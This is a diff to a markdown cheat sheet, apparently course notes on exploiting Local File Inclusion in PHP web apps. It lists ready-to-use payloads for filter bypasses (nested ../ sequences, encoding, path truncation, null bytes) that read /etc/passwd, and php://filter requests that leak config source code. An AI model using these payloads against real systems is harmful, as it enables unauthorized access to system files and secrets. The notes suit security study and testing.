@@ -54,3 +54,101 @@ Example: `http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00`
 
 ---
 
+# Basic Bypasses 
+
+### 1. Non-Recursive Path Traversal Filters
+- **Issue**: Filters remove `../` substrings once but do not recursively check the output string.
+- **Bypass**:
+  - Use payloads like `....//`, `..././`, or `....\/`.
+  - Example:
+    ```url
+    http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
+    ```
+
+### 2. Encoding
+- **Issue**: Filters may block `.` and `/` characters.
+- **Bypass**:
+  - URL encode payloads (e.g., `../` -> `%2e%2e%2f`).
+  - Double encoding may bypass additional filters.
+  - Example:
+    ```url
+    http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    ```
+
+### 3. Approved Paths
+- **Issue**: Regex used to restrict files to specific directories (e.g., `./languages/`).
+- **Bypass**:
+  - Start payload with the approved path and use `../` traversal.
+  - Example:
+    ```url
+    http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+    ```
+
+### 4. Appended Extensions
+- **Issue**: Application appends extensions like `.php` to input strings.
+- **Bypass**:
+  - Restricted to `.php` files in modern PHP versions.
+  - Explore file content (e.g., source code).
+
+### 5. Path Truncation (PHP < 5.3/5.4)
+- **Issue**: PHP truncates strings beyond 4096 characters and removes trailing slashes/single dots.
+- **Bypass**:
+  - Create long paths where `.php` is truncated.
+  - Automate string creation:
+    ```bash
+    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+    ```
+
+### 6. Null Byte Injection (PHP < 5.5)
+- **Issue**: Null byte `%00` terminates the string, ignoring appended extensions.
+- **Bypass**:
+  - Payload: `/etc/passwd%00`
+  - Example:
+    ```url
+    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00
+    ```
+
+---
+# PHP Filters 
+
+### Overview
+- **PHP Wrappers**: Allow access to I/O streams and extend Local File Inclusion (LFI) exploitation.
+- **Use Cases**: Can read PHP source code, gain remote code execution, and assist in attacks like XXE.
+
+### Input Filters
+- **PHP Filters**: A type of PHP Wrapper that filters input streams via `php://filter/`.
+- **Parameters**:
+  - `resource`: Specifies the stream (e.g., a file) to filter.
+  - `read`: Applies the specified filter (e.g., `convert.base64-encode`).
+- **Types of Filters**:
+  - String Filters
+  - Conversion Filters (e.g., `convert.base64-encode`)
+  - Compression Filters
+  - Encryption Filters
+
+### Fuzzing for PHP Files
+- Use tools like `ffuf` or `gobuster` to identify PHP pages:
+  ```bash
+  ffuf -w /path/to/list.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+  ```
+- **Tip**: Scan for all response codes (200, 301, 302, 403) to find potential sources.
+
+### Source Code Disclosure
+1. Identify a PHP file, e.g., `config.php`.
+2. Include the file using LFI with a base64 filter:
+   ```url
+   php://filter/read=convert.base64-encode/resource=config
+   ```
+   Access:
+   ```
+   http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
+   ```
+3. Base64 decode the result to retrieve the source code:
+   ```bash
+   echo 'Base64_String_Here' | base64 -d
+   ```
+- **Tip**: Ensure the entire base64 string is copied for full decoding.
+
+---
+
+
